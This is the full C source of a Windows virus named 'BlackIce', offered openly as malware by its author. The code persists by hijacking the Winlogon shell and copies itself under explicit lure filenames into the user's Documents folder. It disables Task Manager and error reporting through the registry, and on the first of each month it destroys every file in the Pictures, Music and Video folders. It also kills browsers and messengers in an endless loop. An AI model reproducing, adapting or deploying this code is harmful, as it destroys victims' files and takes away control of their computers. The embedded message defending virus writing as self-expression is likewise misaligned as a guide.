/*
Payload of BlackIce:

- (Simple) stealth method to start automatically
- Copy to %windir%\system32
- Copy to personal folder several times and using random made names
- Disable the Windows Taskmanager over a bug found by Izee
- Before user is able to login pop up a message window
- Blank the desktop wallpaper
- On every 1st overwrite files in personal folder (my pictures/music/video)
- Stay in background and kill several processes to stop user from surfing and other things

#########################################################################
#########################################################################

	Author: SkyOut

	Compiled with: -> Visual C++ 2005 Express Edition
				   -> Microsoft PSDK for Windows Server 2003 R2

	Finished: 25th July 2006 - 20:15 - GMT +01:00

*/

/* Defining Windows Version being WindowsXP (0x0501) */
#define WIN32_WINNT 0x0501

/* The headers we need for our virus */
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <sys/stat.h>
#include <tlhelp32.h>

/* Copy to %windir%\system32\BlackIce.exe 
and start over changing the system.ini file, this will be
saved in the registry on newer Windows systems:
->HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
->"Shell" = "Explorer.exe X:\WINDOWS\system32\BlackIce.exe"
(Tools like msconfig.exe are not able to see this)

Two other ways to start over win.ini are commented out, these
values are also savend in the registry on newer Windows systems.*/
void InfectPC(void)
{
	HMODULE Mod;
	char szSysDir[MAX_PATH];
	/*char szWinDir[MAX_PATH];*/
	char szVirusPath[MAX_PATH];
	char szFileToStart[] = "Explorer.exe ";

	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	/*GetWindowsDirectory(szWinDir, sizeof(szWinDir));*/

	strcat_s(szSysDir, MAX_PATH, "\\BlackIce.exe");
	/*strcat_s(szWinDir, MAX_PATH, "\\BlackIce.exe");*/

	Mod = GetModuleHandle(NULL);
	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));

	CopyFile(szVirusPath, szSysDir, FALSE);
	/*CopyFile(szVirusPath, szWinDir, FALSE);*/	

	/*WriteProfileString("windows", "run", szSysDir);
	WriteProfileString("windows", "load", szWinDir);*/

	strcat_s(szFileToStart, MAX_PATH, szSysDir);
	WritePrivateProfileString("boot", "Shell", szFileToStart, "system.ini");
}

/* Copy the virus to the users personal folders ten times and choose
random names by using 5 different arrays */
void CopyToPC(void)
{	
	HMODULE Mod;
	char szPornName[MAX_PATH];
	char szPersonalFolder[MAX_PATH];
	char szVirusPath[MAX_PATH];
	int i;

	char *szName1[] = {"horny", "lewd", "lustful", "prurient", "randy", "ruttish",
								"salacious", "voluptuous", "sexy", "hot", "addicted", "dirty", "evil"};

	char *szName2[] = {"Anna", "Maria", "Nicci", "Julia", "Mary", "Patricia", "Susan", "Jennifer",
								"Sandra", "Sharon", "Laura", "Jessica", "Christine", "Ashley", "Christina",
								"Rachel", "Marylin", "Emily", "Crystal", "Victoria", "Shannon", "Eva"};

	char *szName3[] = {"fucked", "screwed", "shagged"};

	char *szName4[] = {"hard", "soft", "anal", "oral", "allnight", "wholeday", "alltime","regardless", 
								"brutal", "bestial", "tough", "violent"};

	char *szName5[] = {"mpg", "mpeg", "avi", "wmv", "jpg", "bmp", "jpeg", "png", "JPG", "BMP", "JPEG", "PNG"};

	Mod = GetModuleHandle(NULL);
	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));

	SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, szPersonalFolder);

	SetCurrentDirectory(szPersonalFolder);
	
	/* Initialize the random number generator */
	srand(time(NULL));

	for (i = 0; i < 10; i++)
	{
	sprintf_s(szPornName, MAX_PATH, "%s_%s_%s_%s.%s.exe", szName1[(rand()%12)], szName2[(rand()%21)], szName3[(rand()%2)], szName4[(rand()%11)], szName5[(rand()%11)]);
	CopyFile(szVirusPath, szPornName, FALSE);
	}
}

/* A very nice thing discovered by Izee, it is a bug in the Taskmanager of
Windows (tested on WindowsXP SP 2) and this fumction changes the binary value of a registry
key, after this the Taskmanager will crash when opened, the normally opening window
asking for an error message to Microsoft is also blocked.*/
void TaskmngrDisableBug(void)
{
	HKEY hKey;
	DWORD dwData = 0;

	BYTE bBuff[] = {00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\
	00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00};

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\TaskManager", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Preferences", 0, REG_BINARY, bBuff, sizeof(bBuff));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\PCHealth\\ErrorReporting", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "DoReport", 0, REG_DWORD, (LPBYTE)&dwData, sizeof(DWORD));
	RegCloseKey(hKey);

}

/* Before user can access the login screen a window pops up showing some text specified by me =) */
void Messagebox(void)
{
	HKEY hKey;
	char szCaption[] = "<>< BlackIce ><>";
	char szText[] = "The computer has been infected with the BlackIce Virus by | Skyout |>[Electrical Ordered Freedom]";

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "LegalNoticeCaption", 0, REG_SZ, szCaption, sizeof(szCaption));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "LegalNoticeText", 0, REG_SZ, szText, sizeof(szText));
	RegCloseKey(hKey);
}

/* This will will blank the desktop wallpaper */
void BlankWallpaper(void)
{
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, " ", 0);
}

/* I think the function does not need to be explained ;) */
void HideTaskbar(void)
{
	ShowWindow(FindWindow("Shell_TrayWnd", NULL), SW_HIDE);
}

/* We check for a specific registry key to determine if the computer is infected with BlackIce */
BOOL IsPCInfected()
{
	HKEY hKey;
	char szBuf[MAX_PATH];
	DWORD dwBufLength = sizeof(szBuf);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\BlackIce", 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, "BlackIce", 0, NULL, szBuf, &dwBufLength);
	RegCloseKey(hKey);

	if (szBuf[0]!='B' || szBuf[1]!='l' || szBuf[3]!='a' || szBuf[4]!='c' || szBuf[5]!='k' || szBuf[6]!='I' || szBuf[7]!='c' || szBuf[8]!='e')
	{
		return -1;
	}
	else
	{
		return 0;
	}
}

/* A very little, but for many people important, process list of instant messenger programs, browsers and email clients */
char *ProcessList[] = {"icq.exe", "msnmsgr.exe", "YahooMessenger.exe", "gaim.exe", "mirc.exe",
						"firefox.exe", "iexplore.exe", "Opera.exe", "thunderbird.exe", "msimn.exe", 0};

/* A function doing a process enumeration, comparing it to our ProcessList array and killing those processes */
void KillProcess(char *ProcessList)
{
	HANDLE hProcSnap;
	HANDLE hProc;
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hProcSnap, &pe32);

	do
	{
		hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
		if(strcmp(pe32.szExeFile, ProcessList)==0)
		{
			TerminateProcess(hProc, 0);
			CloseHandle(hProc);
		}
		CloseHandle(hProc);

	}while (Process32Next(hProcSnap, &pe32));
}

/* An overwriter function, it takes in a string to a folder location on the computer and
overwrites every file (not recursive) in this folder with a simple text, it does this by
->Deleting the file
->Creating a new one with the same name and copying the short data into it */
BOOL Overwrite(char *szOverwrite) 
{
	HANDLE hFind;
	HANDLE hFile;
    WIN32_FIND_DATA w32FD;
	DWORD dwNumberOfBytesWritten;
    char szFileName[MAX_PATH];
	char szFileName2[MAX_PATH];
	char szBuffer[] = "[ELECTRICAL ORDERED FREEDOM]  [<[BlackIce Virus]>]  |<>|SkyOut|<>|\r\n";
 
    strcpy_s(szFileName, sizeof(szFileName), szOverwrite);
    strcat_s(szFileName, sizeof(szFileName), "\\*");

    hFind = FindFirstFile(szFileName, &w32FD);

	do
	{
		if (!((strcmp((char*) w32FD.cFileName, ".") && strcmp((char*) w32FD.cFileName, ".."))))
		{
			continue;
		}
		if(w32FD.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
		{
			_chmod(szFileName, _S_IWRITE);
		}
		strcpy_s(szFileName2, MAX_PATH, szOverwrite);
		((strcat_s(szFileName2, MAX_PATH, "\\")) & (strcat_s(szFileName2, MAX_PATH, w32FD.cFileName)));
		DeleteFile(szFileName2);

		hFile = CreateFile(szFileName2, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hFile, szBuffer, sizeof(szBuffer), &dwNumberOfBytesWritten, NULL);
		CloseHandle(hFile);

	}while(FindNextFile(hFind, &w32FD));
	FindClose(hFind);
	return 1;
}

/* ############################################################################################### */
/* --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- */
/* ############################################################################################### */

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	BOOL bInfected;
	SYSTEMTIME stTime;
	char szDate[MAX_PATH];
	int i;

	/* Test if the computer is still infected */
	bInfected = IsPCInfected();
	
	/* If not write the registry value telling us this for the next time and call some of the above functions */
	if(bInfected == -1)
	{
		HKEY hKey;
		char szBlackIce[] = "BlackIce";

		RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\BlackIce", &hKey);
		RegSetValueEx(hKey, "BlackIce", 0, REG_SZ, szBlackIce, sizeof(szBlackIce));
		RegCloseKey(hKey);

		InfectPC();
		CopyToPC();
		TaskmngrDisableBug();
		Messagebox();
		BlankWallpaper();
	}

	/* We check for the system date and get a value like "1", "12", "23", ... showing us the day */
	GetSystemTime(&stTime);
	GetDateFormat(LOCALE_USER_DEFAULT, 0, &stTime, "dd", szDate, sizeof(szDate));

	/* If it is the first of a month we begin to overwrite every file in:
	->MY PICTURES
	->MY MUSIC
	->MY VIDEO
	these folders are located in the personal folder a user. Then the virus hides the taskbar and
	displays a message telling the user some stuff */
	if(stTime.wDay == 1)
	{	
		char szPath[MAX_PATH];

		SHGetFolderPath(NULL, CSIDL_MYPICTURES, NULL, SHGFP_TYPE_CURRENT, szPath);
		Overwrite(szPath);

		SHGetFolderPath(NULL, CSIDL_MYMUSIC, NULL, SHGFP_TYPE_CURRENT, szPath);
		Overwrite(szPath);

		SHGetFolderPath(NULL, CSIDL_MYVIDEO, NULL, SHGFP_TYPE_CURRENT, szPath);
		Overwrite(szPath);

		HideTaskbar();

		MessageBox(NULL, "\t|<>| BlackIce VIRUS by SkyOut [ELECTRICAL ORDERED FREEDOM] |<>|\n\n"
					     "#########################################################\n\n"
						 "My statement:\n"
						 "You might ask yourself why I write virii, do I want to destroy you?\n"
						 "Maybe I like to see people loosing things, which are important for them?\n"
						 "Hmm, nice ideas, but no!\n\n"
						 "I write viruses as a way of self expression and to do something creatively,\n"
						 "using something in a way it was not expected to be used is very interestind and is much fun.\n"
						 "When you are infected by this virus it only shows that you do not have a good knowlegde\n"
						 "about computers and risks, so start learning about this now!\n\n"
						 "SkyOut[EOF]",
						 "Electrical Ordered Freedom", 0);
	}
	
	/* Let us begin running in the background and really fuck up the user =)
	With this code we will check running processes every five seconds and kill processes
	being in our ProcessList array */
	do
	{
		for (i = 0; ProcessList[i]; i++)
		{
			KillProcess(ProcessList[i]);
		}
		Sleep(5000);
	}while(1);
}